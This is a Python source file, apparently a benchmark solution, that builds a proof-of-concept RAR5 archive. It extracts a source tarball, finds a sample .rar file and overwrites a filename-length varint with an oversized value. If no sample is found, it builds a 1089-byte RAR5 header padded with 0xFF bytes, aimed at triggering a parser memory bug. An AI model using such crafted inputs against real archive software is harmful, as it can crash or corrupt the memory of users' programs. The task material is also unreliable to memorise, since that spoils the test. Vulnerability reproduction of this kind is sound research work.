import os
import tarfile
import tempfile


class Solution:
    def _extract_tarball(self, src_path: str) -> str:
        tmpdir = tempfile.mkdtemp(prefix="poc_src_")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(tmpdir)
        except Exception:
            pass
        return tmpdir

    def _find_rar5_sample(self, root: str) -> str | None:
        signature = b"Rar!\x1a\x07\x01\x00"
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if fn.lower().endswith(".rar"):
                    path = os.path.join(dirpath, fn)
                    try:
                        with open(path, "rb") as f:
                            head = f.read(len(signature))
                        if head == signature:
                            return path
                    except OSError:
                        continue
        return None

    def _find_name_len_field(self, data: bytes):
        n = len(data)
        ascii_runs = []

        def is_printable(b: int) -> bool:
            return 32 <= b <= 126

        i = 0
        while i < n:
            if is_printable(data[i]):
                start = i
                i += 1
                while i < n and is_printable(data[i]):
                    i += 1
                length = i - start
                if length >= 3:
                    ascii_runs.append((start, length))
            else:
                i += 1

        if not ascii_runs:
            return None

        def decode_varint_leb(start: int, end: int):
            value = 0
            shift = 0
            pos = start
            while pos < end:
                b = data[pos]
                value |= (b & 0x7F) << shift
                shift += 7
                pos += 1
                if not (b & 0x80):
                    return value, pos - start
            return None, None

        def decode_varint_beb(start: int, end: int):
            value = 0
            pos = start
            while pos < end:
                b = data[pos]
                value = (value << 7) | (b & 0x7F)
                pos += 1
                if not (b & 0x80):
                    return value, pos - start
            return None, None

        for start, length in ascii_runs:
            for j in range(max(0, start - 8), start):
                for codec_name, decoder in (("leb", decode_varint_leb), ("beb", decode_varint_beb)):
                    val, width = decoder(j, start)
                    if val is None or width is None:
                        continue
                    if j + width == start and val == length:
                        return {
                            "offset": j,
                            "width": width,
                            "name_len": length,
                            "codec": codec_name,
                        }
        return None

    def _mutate_sample(self, sample_path: str) -> bytes | None:
        try:
            with open(sample_path, "rb") as f:
                data = bytearray(f.read())
        except OSError:
            return None

        info = self._find_name_len_field(data)
        if not info:
            return None

        off = info["offset"]
        orig_width = info["width"]
        name_len = info["name_len"]

        max_new_width = orig_width + min(name_len, 7)
        if max_new_width > 8:
            max_new_width = 8
        new_width = max_new_width
        if new_width <= 0 or off + new_width > len(data):
            return None

        pattern = [0xFF] * (new_width - 1) + [0x7F]
        for i, b in enumerate(pattern):
            data[off + i] = b

        return bytes(data)

    def solve(self, src_path: str) -> bytes:
        root = self._extract_tarball(src_path)
        sample_path = self._find_rar5_sample(root)
        if sample_path:
            poc = self._mutate_sample(sample_path)
            if poc:
                return poc

        signature = b"Rar!\x1a\x07\x01\x00"
        total_len = 1089
        if total_len < len(signature):
            return signature
        body_len = total_len - len(signature)
        body = bytearray(body_len)
        if body_len >= 16:
            body[0:4] = b"\x00\x00\x00\x00"
            for i in range(4, 12):
                body[i] = 0xFF
        return signature + bytes(body)